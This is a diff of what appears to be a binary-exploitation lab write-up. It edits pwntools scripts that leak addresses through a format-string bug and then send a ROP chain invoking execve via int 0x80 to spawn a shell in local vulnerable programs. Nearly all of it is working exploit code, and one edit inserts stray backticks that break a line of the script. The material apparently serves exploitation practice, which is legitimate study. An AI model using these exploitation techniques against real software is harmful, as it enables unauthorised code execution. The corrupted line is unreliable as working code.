@@ -459,7 +459,6 @@ def set_ecx(val):
 def int80():
     return p32(0x0804a6c2)
 
-#addres in bss section
 buffor = 0x80e8144
 
 shellcode = b''.join([
@@ -475,6 +474,7 @@ shellcode = b''.join([
 p = process('./vuln-3.o')
 
 p.sendline(b"")
+
 p.sendline(shellcode)
 
 p.interactive()
@@ -553,7 +553,7 @@ shellcode = b''.join([
     set_ecx(0x0),
     set_eax(0xb),
     set_edx_ebx(0x0, buffor),
-    int80()
+    ``int80()
 ])
 ```
 
@@ -595,21 +595,23 @@ def int80():
 
 p = process('./vuln-4.o')
 
-# retrive offset and buffor addres
 p.sendline("%p" * 7)
+
 data = p.readline()
+
 data = data.split(b"0x")
+
 for i in range(len(data)):
     log.info("{} {}".format(i, data[i]))
 
 offset = int(data[3],16) - 0x00003f90
+
 log.info("START_OF_TEXT: 0x%08x" % offset)
 
 buffor = int(data[1],16) - 0xd4
+
 log.info("BUFOR: 0x%08x" % buffor)
 
-
-# shellcode
 padding_len = 28
 
 shellcode = b''.join([
